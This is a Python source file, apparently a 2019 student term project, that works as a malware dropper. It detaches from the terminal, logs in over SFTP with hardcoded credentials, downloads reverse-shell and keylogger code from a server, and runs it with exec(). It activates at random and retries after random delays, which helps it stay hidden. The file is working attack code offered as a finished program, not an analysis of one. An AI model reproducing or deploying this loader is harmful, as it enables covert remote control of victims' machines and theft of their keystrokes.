#==============================================================================
 #   Assignment:  Term Project
 #
 #       Author:  Abiram Kaimathuruthy, Brian Smith
 #     Language:  Python
 #   To Compile:  n/a
 #
 #        Class:  DPI912
 #    Professor:  Prof. Kaduri
 #     Due Date:  2019-12-06
 #    Submitted:  2019-12-06
 #
 #-----------------------------------------------------------------------------
 #
 #  Description:  Run a keylogger and reverse shell on the user computer
 #
 #        Input:  N/A
 #
 #       Output:  N/A
 #
 #    Algorithm:  Disconnect from terminal and get code for reverse shell and a kerlogger from the server. Start running these 2 classes and send the output to the server.
 #
 #   Required Features Not Included:  n/a
 #
 #   Known Bugs:  n/a
 #
 #   Classification: A
 #
#==============================================================================
import time
import os
import paramiko
import sys
import random
import signal
import subprocess
import traceback

ONE_HOUR_IN_SECONDS = 3600
TWENTY_MINUTES_IN_SECONDS = 1200

REVERSE_SHELL_FILE_PATH = "/home/lab/Erebus/input/reverseShell.py"
KEY_LOGGER_FILE_PATH = "/home/lab/Erebus/input/keyLogger.py"

HOST_IP_ADDRESS = "localhost"
HOST_PORT = 22

USERNAME = "lab"
PASSWORD = "lab"


def main() -> None:
    if not shouldRun():
        return

    processId = os.fork()

    if childProcess(processId):
        startMaliciousBehavior()

def shouldRun() -> bool:
    """Return whether we just run the program or not."""
    chance = random.randrange(0, 100)
    return chance < 40


def childProcess(processId: int) -> bool:
    """Return True if process is a child and False otherwise."""
    return processId == 0


def startMaliciousBehavior() -> None:
    addSignalHandlers()
    flushInputOutput()
    disconnectFromTerminal()
    executeCodeFromServer()
    waitForever()


def addSignalHandlers() -> None:
    """Add all the signal handlers for the program.
    
    The following singals are caught:
        * SIGHUP
    """
    signal.signal(signal.SIGHUP, signal.SIG_IGN)


def flushInputOutput() -> None:
    """Flush out (empty) stdout as well as stderr."""
    sys.stdout.flush()
    sys.stderr.flush()


def disconnectFromTerminal():
    """Disconnect from terminal.

    Disconnect from terminal by changing the stdin, stdout and stderr
    to devnull. This ensures that the process is no longer connected to
    the session.
    """
    with open(os.devnull, "rb", 0) as devNull:
        os.dup2(devNull.fileno(), sys.stdin.fileno())
        os.dup2(devNull.fileno(), sys.stdout.fileno())
        os.dup2(devNull.fileno(), sys.stderr.fileno())


def executeCodeFromServer() -> None:
    while True:
        try:
            with paramiko.Transport((HOST_IP_ADDRESS, HOST_PORT)) as transport:
                transport.connect(None, USERNAME, PASSWORD)
                sftp = paramiko.SFTPClient.from_transport(transport)

                executeReverseShell(sftp)
                executeKeyLogger(sftp)
                break
        except paramiko.ssh_exception.SSHException:
            waitTime = random.randint(TWENTY_MINUTES_IN_SECONDS, ONE_HOUR_IN_SECONDS)
            time.sleep(waitTime)
            continue
        except:
            break


def executeReverseShell(sftp: paramiko.SFTPClient) -> None:
    """Download and execute the code for reverse shell."""
    with sftp.open(REVERSE_SHELL_FILE_PATH) as reverseShellFile:
        reverseShellCodeAsString = reverseShellFile.read()
        exec(reverseShellCodeAsString, globals())
        ReverseShell().start()


def executeKeyLogger(sftp: paramiko.SFTPClient) -> None:
    """Download and execute the code for key logging."""
    with sftp.open(KEY_LOGGER_FILE_PATH) as keyLoggerFile:
        keyLoggerCodeAsString = keyLoggerFile.read()
        exec(keyLoggerCodeAsString, globals())
        KeyLogger().start()


def waitForever() -> None:
    while True:
        time.sleep(ONE_HOUR_IN_SECONDS)

